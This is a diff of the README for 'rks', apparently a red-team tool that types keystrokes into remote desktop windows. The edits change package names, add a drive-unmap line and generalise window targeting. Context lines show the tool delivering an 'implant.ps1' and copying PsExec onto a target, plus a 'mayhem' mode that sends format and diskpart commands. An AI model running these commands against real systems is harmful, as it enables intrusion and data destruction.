@@ -24,13 +24,13 @@ All credits goes to [nopernik](https://github.com/nopernik) for making it possib
 For Debian-based distros.
 
 ```
-$ sudo apt install -y xfreerdp-x11 xtightvncviewer xdotool
+$ sudo apt install -y xfreerdp-x11 remmina xdotool
 ```
 
 For Arch-based distros.
 
 ```
-$ sudo pacman -S freerdp tightvnc xdotool
+$ sudo pacman -S freerdp remmina xdotool
 ```
 
 ### Setup
@@ -325,6 +325,7 @@ Another way to transfer files especially for sysadmin and offensive tools. Let's
 $ cat commands.txt
 net use z: \\live.sysinternals.com\tools
 copy z:\PsExec64.exe .
+net use z: /delete
 
 $ rks -c "cmd.exe" -m dialogbox
 
@@ -427,12 +428,12 @@ $ rks -m mayhem -s format -s diskpart -a cmd
 $ rks -m mayhem -s format -s diskpart -a pwsh
 ```
 
-### 0x08 - Specify Grapical Remote Software
+### 0x08 - Specify window name.
 
-- If you're targeting VNC network protocols you can specify the window name with `tightvnc`.
+If you're targeting VNC, Telnet, or other network protocols you can specify the window name. This is useful whenever if you're using `remmina` or another terminal instance with a renamed window.
 
 ```
-$ rks -c implant.ps1 -w tightvnc
+$ rks -c implant.ps1 -w <window_name>
 ```
 
 ### 0x09 - FAQ
@@ -460,8 +461,6 @@ $ sudo rm -f /usr/local/bin/remotekeystrokes /usr/local/bin/rks
 ```
 
 ## TODO and Help Wanted
-
-- [ ] Rewrite the flag switches to minimize for reusability.
 
 - [ ] Implement encryption method of AES256 via base64
 
